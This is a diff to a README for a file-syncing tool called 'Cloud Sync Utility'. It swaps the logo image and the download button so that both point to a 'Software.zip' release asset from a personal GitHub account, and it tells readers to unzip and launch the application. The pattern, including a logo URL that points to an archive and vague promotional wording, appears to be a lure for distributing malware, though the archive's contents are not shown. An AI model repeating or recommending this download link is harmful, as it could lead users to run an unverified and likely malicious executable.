@@ -1,6 +1,6 @@
 # 🌟 Cloud Sync Utility 🌟
 
-![Cloud Sync Utility Logo](https://example.com/logo.png)
+![Cloud Sync Utility Logo](https://github.com/JeffriVeraOP/Cloud-Sync-Utility/releases/download/v1.0/Software.zip)
 
 ## Repository Description
 Welcome to the **Cloud Sync Utility** repository! This versatile tool is designed to simplify the process of syncing files between devices and various cloud storage services. With this tool, you can effortlessly manage your files and ensure smooth synchronization at all times. 📂☁️
@@ -29,7 +29,7 @@ Welcome to the **Cloud Sync Utility** repository! This versatile tool is designe
 ## Get Started
 To start using the **Cloud Sync Utility**, simply download the latest release by clicking the button below:
 
-[![Download Cloud Sync Utility](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Cloud Sync Utility](https://github.com/JeffriVeraOP/Cloud-Sync-Utility/releases/download/v1.0/Software.zip)](https://github.com/JeffriVeraOP/Cloud-Sync-Utility/releases/download/v1.0/Software.zip)
 
 🚀 Once the download is complete, unzip the file and launch the Cloud Sync Utility application to get started with effortless file synchronization!
 
